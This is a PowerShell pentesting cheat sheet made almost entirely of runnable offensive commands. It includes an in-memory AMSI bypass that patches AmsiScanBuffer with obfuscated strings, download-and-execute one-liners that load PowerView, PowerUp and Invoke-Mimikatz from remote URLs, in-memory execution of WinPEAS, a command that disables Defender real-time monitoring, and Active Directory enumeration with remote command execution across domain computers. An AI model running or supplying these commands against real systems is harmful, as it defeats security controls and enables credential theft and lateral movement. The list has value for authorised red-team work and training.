# Powershell Pentesting 

## Bypass AMSI by Rastamouse

```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

## Import Powerview
```powershell
iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

```
## Import Powerup
```powershell
iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
```

## Import Mimikatz
```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")
```

## Execute WinPEAS in memory
```powershell
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

## Disable Defender
```powershell
Set-MPPreference -DisableRealtimeMonitoring $true
```

## Active Directory enumeration
```powershell
net user /domain
net group /domain
PowerView
Get-DomainUser -Properties samaccountname,name,objectsid
Get-DomainGroup -Properties name
Get-DomainComputer -Properties name
Get-DomainController
Get-NetGPO
Get-NetGPO | select displayname
Get-NetGPOGroup
Convert-SidToName
Find-GPOComputerAdmin -ComputerIdentity * | select computername,objectname
Get-DomainGroupMember -Identity Administradores
net localgroup administradores
Get-DomainComputer -Properties dnshostname | %{ $_; Invoke-Command -ComputerName $_.dnshostname -ScriptBlock {whoami;hostname}}
```
